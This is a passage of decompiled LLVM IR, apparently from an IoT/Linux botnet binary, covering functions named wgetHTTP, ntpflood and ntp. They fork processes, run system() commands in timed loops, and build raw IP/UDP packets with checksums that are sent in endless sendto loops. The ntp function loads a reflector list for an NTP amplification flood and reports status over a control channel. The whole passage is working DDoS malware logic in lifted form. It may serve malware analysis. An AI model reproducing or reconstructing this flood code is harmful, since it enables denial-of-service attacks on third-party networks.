  %v0_804ab50.in = phi i32 [ %v0_804aad2, %dec_label_pc_804ab3b ], [ %v0_804aa8f, %dec_label_pc_804aa53 ]
  %storemerge = phi i32 [ %v4_804ab45, %dec_label_pc_804ab3b ], [ 0, %dec_label_pc_804aa53 ]
  store i32 %v1_804ab4b, i32* %eax.global-to-local, align 4
  %v2_804ab4e = load i32, i32* %v1_804ab4e, align 4
  store i32 %v2_804ab4e, i32* %eax.global-to-local, align 4
  %v3_804ab53 = inttoptr i32 %v0_804ab50.in to i32*
  store i32 %v2_804ab4e, i32* %v3_804ab53, align 4
  %v1_804ab54 = call i32 @atol(i32 %storemerge)
  %v0_804ab59 = load i32, i32* @esp, align 4
  %v9_804ab5c = mul i32 %v1_804ab54, 20
  store i32 %v9_804ab5c, i32* %eax.global-to-local, align 4
  %v8_804ab63 = icmp sgt i32 %v9_804ab5c, %storemerge
  br i1 %v8_804ab63, label %dec_label_pc_804aa9e, label %dec_label_pc_804ab69

dec_label_pc_804ab69:                             ; preds = %dec_label_pc_804ab48, %entry
  %v0_804ab76 = phi i32 [ %v2_804a5df, %entry ], [ %v9_804ab5c, %dec_label_pc_804ab48 ]
  ret i32 %v0_804ab76

; uselistorder directives
  uselistorder i32 %v9_804ab5c, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804ab1d, { 1, 0, 2 }
  uselistorder i32 %v0_804ab0d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804ab4b, { 1, 0 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v2_804a9b0, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge559, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v2_804a97b, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v2_804a913, { 0, 2, 1 }
  uselistorder i32 %v0_804a83c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a82b, { 1, 0 }
  uselistorder i32 %v2_804a857, { 2, 1, 3, 4, 5, 0, 9, 8, 7, 6, 10 }
  uselistorder i32 %v2_804a703, { 4, 0, 1, 5, 2, 6, 3 }
  uselistorder i32 %v0_804a6f2, { 3, 4, 11, 7, 6, 8, 1, 5, 2, 0, 9, 10 }
  uselistorder i32 %v2_804a6d8, { 2, 1, 0 }
  uselistorder i32 %v4_804a616, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 7, 8, 9, 1, 2, 4, 5, 3, 6, 10, 11, 12, 13, 14, 15, 18, 16, 17, 0, 19, 20, 21, 40, 22, 23, 24, 25, 27, 28, 29, 30, 31, 26, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ab48, { 1, 0 }
  uselistorder label %dec_label_pc_804ab3b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804a63c, { 1, 0 }
  uselistorder label %dec_label_pc_804a616, { 1, 0 }
}

define i32 @wgetHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-2068 = alloca i32, align 4
  %v1_804ab86 = call i32 @mfork(i32 %arg2)
  %v1_804ab8e = icmp eq i32 %v1_804ab86, 0
  %v1_804ab90 = icmp eq i1 %v1_804ab8e, false
  br i1 %v1_804ab90, label %dec_label_pc_804aca8, label %dec_label_pc_804ab96

dec_label_pc_804ab96:                             ; preds = %entry
  %v4_804ab96 = add i32 %arg3, -1
  %v9_804ab96 = sub i32 0, %arg3
  %v10_804ab96 = and i32 %arg3, %v9_804ab96
  %v11_804ab96 = icmp slt i32 %v10_804ab96, 0
  %v12_804ab96 = icmp eq i32 %v4_804ab96, 0
  %v13_804ab96 = icmp slt i32 %v4_804ab96, 0
  %v3_804ab9a = icmp eq i1 %v13_804ab96, %v11_804ab96
  %v4_804ab9a = icmp eq i1 %v12_804ab96, false
  %v5_804ab9a = and i1 %v4_804ab9a, %v3_804ab9a
  br i1 %v5_804ab9a, label %dec_label_pc_804abbc, label %dec_label_pc_804ab9c

dec_label_pc_804ab9c:                             ; preds = %dec_label_pc_804ab96
  %v3_804abaa = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_806938c.105 to i32))
  %v1_804abb7 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804abbc

dec_label_pc_804abbc:                             ; preds = %dec_label_pc_804ab96, %dec_label_pc_804ab9c
  %v1_804abca = add i32 %arg4, 8
  %v1_804abcd = inttoptr i32 %v1_804abca to i32*
  %v2_804abcd = load i32, i32* %v1_804abcd, align 4
  %v1_804abd3 = call i32 @atol(i32 %v2_804abcd)
  %v2_804abe3 = call i32 @__GI_time(i32* null)
  %v5_804abeb = add i32 %v2_804abe3, %v1_804abd3
  %v1_804abf1 = call i32 @random()
  %v3_804ac20 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_80693af.143 to i32))
  %v2_804ac4b = ptrtoint i32* %stack_var_-2068 to i32
  br label %dec_label_pc_804ac8c

dec_label_pc_804ac2a:                             ; preds = %dec_label_pc_804ac8c
  %v0_804ac2a = call i32 @random()
  %v3_804ac72 = call i32 @sprintf(i32 %v2_804ac4b, i32 ptrtoint ([181 x i8]* @global_var_80693cc.144 to i32))
  %v1_804ac84 = call i32 @system(i32 %v2_804ac4b)
  br label %dec_label_pc_804ac8c

dec_label_pc_804ac8c:                             ; preds = %dec_label_pc_804abbc, %dec_label_pc_804ac2a
  %v2_804ac91 = call i32 @__GI_time(i32* null)
  %v5_804ac9c = icmp slt i32 %v2_804ac91, %v5_804abeb
  br i1 %v5_804ac9c, label %dec_label_pc_804ac2a, label %dec_label_pc_804ac9e

dec_label_pc_804ac9e:                             ; preds = %dec_label_pc_804ac8c
  %v1_804aca3 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804aca8

dec_label_pc_804aca8:                             ; preds = %entry, %dec_label_pc_804ac9e
  %v0_804aca9 = phi i32 [ %v1_804ab86, %entry ], [ %v1_804aca3, %dec_label_pc_804ac9e ]
  ret i32 %v0_804aca9

; uselistorder directives
  uselistorder i32 %v4_804ab96, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804aca8, { 1, 0 }
  uselistorder label %dec_label_pc_804ac8c, { 1, 0 }
  uselistorder label %dec_label_pc_804abbc, { 1, 0 }
}

define i32 @ntpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8240 = alloca i32, align 4
  %stack_var_-8220 = alloca i32, align 4
  %v2_804acb9 = ptrtoint i32* %stack_var_-8220 to i32
  %v1_804acc5 = add i32 %v2_804acb9, 20
  %v5_804acc8 = inttoptr i32 %v1_804acc5 to i16*
  %v1_804acd7 = add i32 %arg1, 12
  %v2_804acd7 = inttoptr i32 %v1_804acd7 to i32*
  %v3_804acd7 = load i32, i32* %v2_804acd7, align 4
  %v1_804acf5 = add i32 %arg1, 4
  %v2_804acf5 = inttoptr i32 %v1_804acf5 to i32*
  %v3_804acf5 = load i32, i32* %v2_804acf5, align 4
  %v4_804ad04 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804ad0f = icmp slt i32 %v4_804ad04, 0
  %v1_804ad13 = icmp eq i1 %v5_804ad0f, false
  br i1 %v1_804ad13, label %entry.dec_label_pc_804ad36_crit_edge, label %dec_label_pc_804ad15

entry.dec_label_pc_804ad36_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804ad36

dec_label_pc_804ad15:                             ; preds = %entry
  %v0_804ad15 = load i8*, i8** @global_var_8073d70, align 4
  %v1_804ad15 = ptrtoint i8* %v0_804ad15 to i32
  %v6_804ad24 = call i32 @fwrite(i32 ptrtoint ([28 x i8]* @global_var_80691f8.94 to i32), i32 1, i32 27, i32 %v1_804ad15)
  %v2_804ad31 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804ad36

dec_label_pc_804ad36:                             ; preds = %entry.dec_label_pc_804ad36_crit_edge, %dec_label_pc_804ad15
  %v3_804ad3b = call i32 @__GI_time(i32* null)
  %v2_804ad44 = call i32 @init_rand(i32 %v3_804ad3b)
  %tmp39 = bitcast i32* %stack_var_-8220 to i8*
  %v5_804ad60 = call i32 @__GI_memset(i8* %tmp39, i32 0, i32 8192)
  store i32 %v5_804ad60, i32* @eax, align 4
  %v3_804ad6e = call i32 @setup_ip_header(i8* %tmp39)
  store i32 %v3_804ad6e, i32* @eax, align 4
  %v2_804ad79 = call i32 @setup_udp_header(i32 %v1_804acc5)
  %v0_804ad81 = call i32 @random()
  %v2_804ad91 = ashr i32 %v0_804ad81, 31
  %v2_804ad94 = zext i32 %v0_804ad81 to i64
  %v4_804ad94 = zext i32 %v2_804ad91 to i64
  %v5_804ad94 = mul nuw i64 %v4_804ad94, 4294967296
  %v6_804ad94 = or i64 %v5_804ad94, %v2_804ad94
  %v10_804ad94 = srem i64 %v6_804ad94, 64509
  %v11_804ad94 = trunc i64 %v10_804ad94 to i32
  %v1_804ad98 = add i32 %v11_804ad94, 1026
  %v1_804ad9d = urem i32 %v1_804ad98, 65536
  %v2_804ada6 = call i32 @htons(i32 %v1_804ad9d)
  %v3_804ada6 = trunc i32 %v2_804ada6 to i16
  store i16 %v3_804ada6, i16* %v5_804acc8, align 4
  %v2_804adbf = add i32 %v2_804acb9, 12
  %v3_804adbf = inttoptr i32 %v2_804adbf to i32*
  store i32 %v3_804acd7, i32* %v3_804adbf, align 4
  %v1_804adc5 = add i32 %v3_804acf5, 4
  %v2_804adc5 = inttoptr i32 %v1_804adc5 to i32*
  %v3_804adc5 = load i32, i32* %v2_804adc5, align 4
  %v2_804adcb = add i32 %v2_804acb9, 16
  %v3_804adcb = inttoptr i32 %v2_804adcb to i32*
  store i32 %v3_804adc5, i32* %v3_804adcb, align 4
  %v1_804add1 = or i32 %v2_804acb9, 2
  %v2_804add1 = inttoptr i32 %v1_804add1 to i16*
  %v3_804add1 = load i16, i16* %v2_804add1, align 2
  %v3_804add5 = udiv i16 %v3_804add1, 2
  %v9_804add5 = zext i16 %v3_804add5 to i32
  %v3_804ade5 = bitcast i32* %stack_var_-8220 to i16*
  %v4_804ade5 = call i32 @csum(i16* %v3_804ade5, i32 %v9_804add5)
  %v5_804ade5 = trunc i32 %v4_804ade5 to i16
  %v3_804adf2 = add i32 %v2_804acb9, 10
  %v4_804adf2 = inttoptr i32 %v3_804adf2 to i16*
  store i16 %v5_804ade5, i16* %v4_804adf2, align 2
  store i32 1, i32* %stack_var_-8240, align 4
  %v2_804ae00 = ptrtoint i32* %stack_var_-8240 to i32
  %v6_804ae18 = call i32 @__GI_setsockopt(i32 %v4_804ad04, i32 0, i32 3, i32 %v2_804ae00, i32 4)
  %v2_804ae20 = icmp slt i32 %v6_804ae18, 0
  %v1_804ae22 = icmp eq i1 %v2_804ae20, false
  br i1 %v1_804ae22, label %dec_label_pc_804ae45, label %dec_label_pc_804ae24

dec_label_pc_804ae24:                             ; preds = %dec_label_pc_804ad36
  %v0_804ae24 = load i8*, i8** @global_var_8073d70, align 4
  %v1_804ae24 = ptrtoint i8* %v0_804ae24 to i32
  %v6_804ae33 = call i32 @fwrite(i32 ptrtoint ([43 x i8]* @global_var_8069214.95 to i32), i32 1, i32 42, i32 %v1_804ae24)
  %v2_804ae40 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804ae45

dec_label_pc_804ae45:                             ; preds = %dec_label_pc_804ad36, %dec_label_pc_804ae24
  %v3_804ae4a = call i32 @__GI_time(i32* null)
  %v2_804ae53 = call i32 @init_rand(i32 %v3_804ae4a)
  %v3_804aebf = add i32 %v2_804acb9, 4
  %v4_804aebf = inttoptr i32 %v3_804aebf to i16*
  br label %dec_label_pc_804ae65

dec_label_pc_804ae65:                             ; preds = %dec_label_pc_804af1e, %dec_label_pc_804ae45
  %stack_var_-16.0 = phi i32 [ %v3_804acf5, %dec_label_pc_804ae45 ], [ %v3_804ae94, %dec_label_pc_804af1e ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804ae45 ], [ %v4_804af1e, %dec_label_pc_804af1e ]
  %v3_804ae6d = load i16, i16* %v2_804add1, align 2
  %v4_804ae6d = zext i16 %v3_804ae6d to i32
  %v7_804ae89 = call i32 @sendto(i32 %v4_804ad04, i32 %v2_804acb9, i32 %v4_804ae6d, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804ae94 = add i32 %stack_var_-16.0, 532
  %v2_804ae94 = inttoptr i32 %v1_804ae94 to i32*
  %v3_804ae94 = load i32, i32* %v2_804ae94, align 4
  %v1_804aea0 = add i32 %v3_804ae94, 4
  %v2_804aea0 = inttoptr i32 %v1_804aea0 to i32*
  %v3_804aea0 = load i32, i32* %v2_804aea0, align 4
  store i32 %v3_804aea0, i32* %v3_804adcb, align 4
  %v1_804aea9 = call i32 @rand_cmwc(i32 %v3_804ae94)
  %v2_804aeb2 = call i32 @htonl(i32 %v1_804aea9)
  %v3_804aeb2 = trunc i32 %v2_804aeb2 to i16
  store i16 %v3_804aeb2, i16* %v4_804aebf, align 4
  %v3_804aec6 = load i16, i16* %v2_804add1, align 2
  %v3_804aeca = udiv i16 %v3_804aec6, 2
  %v9_804aeca = zext i16 %v3_804aeca to i32
  %v4_804aeda = call i32 @csum(i16* %v3_804ade5, i32 %v9_804aeca)
  %v5_804aeda = trunc i32 %v4_804aeda to i16
  store i16 %v5_804aeda, i16* %v4_804adf2, align 2
  %v0_804aeeb = load i64, i64* @global_var_807cc80.96, align 8
  %v1_804aeeb = trunc i64 %v0_804aeeb to i32
  %v1_804aef0 = add i32 %v1_804aeeb, 1
  %v1_804aef1 = sext i32 %v1_804aef0 to i64
  store i64 %v1_804aef1, i64* @global_var_807cc80.96, align 128
  %v0_804aef6 = load i32, i32* @global_var_807cb68.97, align 8
  %v6_804af01 = icmp ugt i32 %v0_804aef6, %storemerge
  br i1 %v6_804af01, label %dec_label_pc_804ae65.dec_label_pc_804af1e_crit_edge, label %dec_label_pc_804af03

dec_label_pc_804ae65.dec_label_pc_804af1e_crit_edge: ; preds = %dec_label_pc_804ae65
  br label %dec_label_pc_804af1e

dec_label_pc_804af03:                             ; preds = %dec_label_pc_804ae65
  %v0_804af0d = load i32, i32* @global_var_806f718.98, align 8
  %v2_804af16 = sext i32 %v0_804af0d to i64
  %v3_804af16 = call i32 @usleep(i64 %v2_804af16)
  br label %dec_label_pc_804af1e

dec_label_pc_804af1e:                             ; preds = %dec_label_pc_804ae65.dec_label_pc_804af1e_crit_edge, %dec_label_pc_804af03
  %stack_var_-8248.0 = phi i32 [ %storemerge, %dec_label_pc_804ae65.dec_label_pc_804af1e_crit_edge ], [ 0, %dec_label_pc_804af03 ]
  %v4_804af1e = add i32 %stack_var_-8248.0, 1
  br label %dec_label_pc_804ae65

; uselistorder directives
  uselistorder i32 %v3_804ae94, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804acb9, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-8240, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804af1e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae45, { 1, 0 }
  uselistorder label %dec_label_pc_804ad36, { 1, 0 }
}

define i32 @ntp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-576 = alloca i32, align 4
  %stack_var_-652 = alloca i32, align 4
  %stack_var_-620 = alloca i32, align 4
  %v15_804af2f = ptrtoint i32* %stack_var_-620 to i32
  store i32 %v15_804af2f, i32* @eax, align 4
  %v1_804af43 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804af43, i32* %eax.global-to-local, align 4
  %v1_804af4b = icmp eq i32 %v1_804af43, 0
  %v1_804af4d = icmp eq i1 %v1_804af4b, false
  br i1 %v1_804af4d, label %dec_label_pc_804b4d7, label %dec_label_pc_804af53

dec_label_pc_804af53:                             ; preds = %entry
  %v3_804af5f = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804af5f, i32* %eax.global-to-local, align 4
  %v5_804af6a = icmp slt i32 %v3_804af5f, 0
  %v1_804af6e = icmp eq i1 %v5_804af6a, false
  br i1 %v1_804af6e, label %dec_label_pc_804af7a, label %dec_label_pc_804af70

dec_label_pc_804af70:                             ; preds = %dec_label_pc_804af53
  %v1_804af75 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804af75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af7a

dec_label_pc_804af7a:                             ; preds = %dec_label_pc_804af53, %dec_label_pc_804af70
  %v4_804af7a = add i32 %arg3, -5
  %v9_804af7a = sub i32 4, %arg3
  %v10_804af7a = and i32 %v9_804af7a, %arg3
  %v11_804af7a = icmp slt i32 %v10_804af7a, 0
  %v12_804af7a = icmp eq i32 %v4_804af7a, 0
  %v13_804af7a = icmp slt i32 %v4_804af7a, 0
  %v3_804af7e = icmp eq i1 %v13_804af7a, %v11_804af7a
  %v4_804af7e = icmp eq i1 %v12_804af7a, false
  %v5_804af7e = and i1 %v4_804af7e, %v3_804af7e
  br i1 %v5_804af7e, label %dec_label_pc_804af7a.dec_label_pc_804afa0_crit_edge, label %dec_label_pc_804af80

dec_label_pc_804af7a.dec_label_pc_804afa0_crit_edge: ; preds = %dec_label_pc_804af7a
  br label %dec_label_pc_804afa0

dec_label_pc_804af80:                             ; preds = %dec_label_pc_804af7a
  store i32 %arg1, i32* %stack_var_-652, align 4
  %v3_804af8e = call i32 @Send(i32 %arg1, i32 ptrtoint ([112 x i8]* @global_var_8069484.145 to i32))
  store i32 %v3_804af8e, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-652, align 4
  %v1_804af9b = call i32 @__GI_exit(i32 1)
  store i32 %v1_804af9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afa0

dec_label_pc_804afa0:                             ; preds = %dec_label_pc_804af7a.dec_label_pc_804afa0_crit_edge, %dec_label_pc_804af80
  %v12_804afd8.pre-phi = ptrtoint i32* %stack_var_-652 to i32
  %v1_804afa3 = add i32 %arg4, 12
  store i32 %v1_804afa3, i32* %eax.global-to-local, align 4
  %v1_804afa6 = inttoptr i32 %v1_804afa3 to i32*
  %v2_804afa6 = load i32, i32* %v1_804afa6, align 4
  store i32 %v2_804afa6, i32* %edx.global-to-local, align 4
  store i32 %v1_804afa3, i32* %eax.global-to-local, align 4
  %v2_804afae = load i32, i32* %v1_804afa6, align 4
  store i32 %v2_804afae, i32* %ecx.global-to-local, align 4
  store i32 %v1_804afa3, i32* %eax.global-to-local, align 4
  %v2_804afb6 = load i32, i32* %v1_804afa6, align 4
  store i32 %v2_804afb6, i32* @ebx, align 4
  store i32 %v1_804afa3, i32* %eax.global-to-local, align 4
  %v2_804afbe = load i32, i32* %v1_804afa6, align 4
  store i32 %v2_804afbe, i32* %eax.global-to-local, align 4
  %v2_804afc0 = ptrtoint i32* %stack_var_-576 to i32
  store i32 %v2_804afc0, i32* @esi, align 4
  %v3_804afd3 = call i32 @sprintf(i32 %v2_804afc0, i32 ptrtoint ([130 x i8]* @global_var_80694f4.146 to i32))
  store i32 %v2_804afc0, i32* %eax.global-to-local, align 4
  %v2_804afe5 = call i32 @system(i32 %v2_804afc0)
  store i32 %v2_804afe5, i32* %eax.global-to-local, align 4
  %v3_804aff2 = call i32 @__GI_time(i32* null)
  store i32 %v3_804aff2, i32* %eax.global-to-local, align 4
  %v2_804affe = call i32 @srand(i32 %v3_804aff2)
  store i32 0, i32* @global_var_807dca0.85, align 32
  %v0_804b017 = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804b017 = ptrtoint i8* %v0_804b017 to i32
  store i32 %v1_804b017, i32* %eax.global-to-local, align 4
  %v6_804b026 = call i32 @fwrite(i32 ptrtoint ([23 x i8]* @global_var_806932a.101 to i32), i32 1, i32 22, i32 %v1_804b017)
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804b03c = call i32 @malloc(i32 128)
  store i32 %v2_804b03c, i32* %edx.global-to-local, align 4
  %v1_804b04d = inttoptr i32 %v2_804b03c to i8*
  store i32 %v2_804b03c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b054 = call i8* @_memset(i8* %v1_804b04d, i32 0, i32 128)
  %v6_804b054 = ptrtoint i8* %v5_804b054 to i32
  store i32 %v6_804b054, i32* %ecx.global-to-local, align 4
  %v0_804b056 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b05e = add i32 %arg4, 16
  store i32 %v1_804b05e, i32* %eax.global-to-local, align 4
  %v1_804b061 = inttoptr i32 %v1_804b05e to i32*
  %v2_804b061 = load i32, i32* %v1_804b061, align 4
  store i32 %v2_804b061, i32* %eax.global-to-local, align 4
  %v2_804b067 = call i32 @atol(i32 %v2_804b061)
  %v1_804b075 = add i32 %arg4, 20
  store i32 %v1_804b075, i32* %eax.global-to-local, align 4
  %v1_804b078 = inttoptr i32 %v1_804b075 to i32*
  %v2_804b078 = load i32, i32* %v1_804b078, align 4
  store i32 %v2_804b078, i32* %eax.global-to-local, align 4
  %v2_804b07e = call i32 @atol(i32 %v2_804b078)
  store i32 %v2_804b07e, i32* @eax, align 4
  store i32 0, i32* @global_var_807cb68.97, align 8
  store i64 0, i64* @global_var_807cc80.96, align 128
  %v3_804b0b1 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_8069576.147 to i32), i32 ptrtoint ([2 x i8]* @global_var_806915a.88 to i32))
  store i32 %v3_804b0b1, i32* %eax.global-to-local, align 4
  %v8_804b233 = inttoptr i32 %v0_804b056 to i8*
  %v1_804b0cf = and i32 %v0_804b056, -256
  %v5_804b133 = add i32 %v0_804b056, -1
  br label %dec_label_pc_804b22a.outer

dec_label_pc_804b0c1:                             ; preds = %dec_label_pc_804b22a
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b0cf, i32* %eax.global-to-local, align 4
  %v3_804b0d8 = call i32 @_strlen(i8* %v8_804b233)
  %v4_804b0d8 = mul i32 %v3_804b0d8, -1
  %v5_804b0d8 = add i32 %v4_804b0d8, -2
  store i32 %v5_804b0d8, i32* %ecx.global-to-local, align 4
  %v5_804b0df = sub i32 %v0_804b056, %v4_804b0d8
  %v1_804b0e2 = add i32 %v5_804b0df, -1
  store i32 %v1_804b0e2, i32* %eax.global-to-local, align 4
  %v1_804b0e3 = inttoptr i32 %v1_804b0e2 to i8*
  %v2_804b0e3 = load i8, i8* %v1_804b0e3, align 1
  %v3_804b0e3 = zext i8 %v2_804b0e3 to i32
  %v5_804b0e3 = and i32 %v1_804b0e2, -256
  %v6_804b0e3 = or i32 %v3_804b0e3, %v5_804b0e3
  store i32 %v6_804b0e3, i32* %eax.global-to-local, align 4
  %v10_804b0e5 = icmp eq i8 %v2_804b0e3, 10
  br i1 %v10_804b0e5, label %dec_label_pc_804b115, label %dec_label_pc_804b0e9

dec_label_pc_804b0e9:                             ; preds = %dec_label_pc_804b0c1
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b0cf, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804b056, i32* @edi, align 4
  %v3_804b100 = call i32 @_strlen(i8* %v8_804b233)
  %v4_804b100 = mul i32 %v3_804b100, -1
  %v5_804b100 = add i32 %v4_804b100, -2
  store i32 %v5_804b100, i32* @ecx, align 4
  %v5_804b107 = sub i32 %v0_804b056, %v4_804b100
  %v1_804b10a = add i32 %v5_804b107, -1
  store i32 %v1_804b10a, i32* %eax.global-to-local, align 4
  %v1_804b10b = inttoptr i32 %v1_804b10a to i8*
  %v2_804b10b = load i8, i8* %v1_804b10b, align 1
  %v3_804b10b = zext i8 %v2_804b10b to i32
  %v5_804b10b = and i32 %v1_804b10a, -256
  %v6_804b10b = or i32 %v3_804b10b, %v5_804b10b
  store i32 %v6_804b10b, i32* %eax.global-to-local, align 4
  %v10_804b10d = icmp eq i8 %v2_804b10b, 13
  %v1_804b10f = icmp eq i1 %v10_804b10d, false
  br i1 %v1_804b10f, label %dec_label_pc_804b22a, label %dec_label_pc_804b115

dec_label_pc_804b115:                             ; preds = %dec_label_pc_804b0e9, %dec_label_pc_804b0c1
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b0cf, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804b056, i32* @edi, align 4
  %v3_804b12c = call i32 @_strlen(i8* %v8_804b233)
  %v4_804b12c = mul i32 %v3_804b12c, -1
  %v5_804b12c = add i32 %v4_804b12c, -2
  store i32 %v5_804b12c, i32* @ecx, align 4
  %v1_804b136 = sub i32 %v5_804b133, %v4_804b12c
  %v1_804b137 = inttoptr i32 %v1_804b136 to i8*
  store i8 0, i8* %v1_804b137, align 1
  %v0_804b13a = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b13a, i32* %eax.global-to-local, align 4
  %v1_804b13f = icmp eq i32 %v0_804b13a, 0
  %v1_804b141 = icmp eq i1 %v1_804b13f, false
  %v2_804b1bb = call i32 @malloc(i32 540)
  store i32 %v2_804b1bb, i32* %eax.global-to-local, align 4
  br i1 %v1_804b141, label %dec_label_pc_804b1b3, label %dec_label_pc_804b143

dec_label_pc_804b143:                             ; preds = %dec_label_pc_804b115
  store i32 %v2_804b1bb, i32* @global_var_807dca0.85, align 32
  store i32 %v2_804b1bb, i32* %eax.global-to-local, align 4
  %v1_804b15d = inttoptr i32 %v2_804b1bb to i32*
  store i32 0, i32* %v1_804b15d, align 4
  %v0_804b163 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b163 = add i32 %v0_804b163, 4
  %v2_804b163 = inttoptr i32 %v1_804b163 to i32*
  store i32 0, i32* %v2_804b163, align 4
  %v0_804b16a = load i32, i32* %eax.global-to-local, align 4
  %v1_804b16a = add i32 %v0_804b16a, 8
  %v2_804b16a = inttoptr i32 %v1_804b16a to i32*
  store i32 0, i32* %v2_804b16a, align 4
  %v0_804b171 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b171 = add i32 %v0_804b171, 12
  %v2_804b171 = inttoptr i32 %v1_804b171 to i32*
  store i32 0, i32* %v2_804b171, align 4
  %v0_804b178 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b178, i32* @ebx, align 4
  %v2_804b184 = call i32 @inet_addr(i32 %v0_804b056)
  %v1_804b18c = load i32, i32* @ebx, align 4
  %v2_804b18c = add i32 %v1_804b18c, 4
  %v3_804b18c = inttoptr i32 %v2_804b18c to i32*
  store i32 %v2_804b184, i32* %v3_804b18c, align 4
  %v0_804b18f = load i32, i32* @global_var_807dca0.85, align 32
  %v2_804b19a = add i32 %v0_804b18f, 532
  %v3_804b19a = inttoptr i32 %v2_804b19a to i32*
  store i32 %v0_804b18f, i32* %v3_804b19a, align 4
  %v0_804b1a0 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b1a0, i32* @edx, align 4
  store i32 %v0_804b1a0, i32* %eax.global-to-local, align 4
  %v2_804b1ab = add i32 %v0_804b1a0, 536
  %v3_804b1ab = inttoptr i32 %v2_804b1ab to i32*
  store i32 %v0_804b1a0, i32* %v3_804b1ab, align 4
  br label %dec_label_pc_804b227

dec_label_pc_804b1b3:                             ; preds = %dec_label_pc_804b115
  store i32 %v2_804b1bb, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v5_804b1d6 = inttoptr i32 %v2_804b1bb to i8*
  %v5_804b1d7 = call i32 @__GI_memset(i8* %v5_804b1d6, i32 0, i32 540)
  store i32 %v5_804b1d7, i32* %eax.global-to-local, align 4
  %v2_804b1e5 = call i32 @inet_addr(i32 %v0_804b056)
  %v2_804b1f2 = add i32 %v2_804b1bb, 4
  %v3_804b1f2 = inttoptr i32 %v2_804b1f2 to i32*
  store i32 %v2_804b1e5, i32* %v3_804b1f2, align 4
  %v0_804b1f5 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b1f5, i32* %edx.global-to-local, align 4
  %v2_804b1fe = add i32 %v2_804b1bb, 536
  %v3_804b1fe = inttoptr i32 %v2_804b1fe to i32*
  store i32 %v0_804b1f5, i32* %v3_804b1fe, align 4
  %v0_804b204 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b204, i32* %eax.global-to-local, align 4
  %v1_804b209 = add i32 %v0_804b204, 532
  %v2_804b209 = inttoptr i32 %v1_804b209 to i32*
  %v3_804b209 = load i32, i32* %v2_804b209, align 4
  %v2_804b212 = add i32 %v2_804b1bb, 532
  %v3_804b212 = inttoptr i32 %v2_804b212 to i32*
  store i32 %v3_804b209, i32* %v3_804b212, align 4
  %v0_804b218 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b218, i32* @edx, align 4
  store i32 %v2_804b1bb, i32* %eax.global-to-local, align 4
  %v2_804b221 = add i32 %v0_804b218, 532
  %v3_804b221 = inttoptr i32 %v2_804b221 to i32*
  store i32 %v2_804b1bb, i32* %v3_804b221, align 4
  br label %dec_label_pc_804b227

